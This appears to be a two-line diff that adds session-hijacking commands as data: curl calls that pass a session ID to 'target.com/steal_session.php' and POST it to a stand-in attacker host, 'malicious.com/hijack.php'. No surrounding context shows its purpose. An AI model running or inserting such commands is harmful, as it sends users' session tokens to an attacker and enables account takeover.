@@ -1,0 +1,2 @@
+session_id=abcdef123456; curl -X GET http://target.com/steal_session.php?session_id=abcdef123456
+curl -X POST http://malicious.com/hijack.php -d "session_id=abcdef123456"
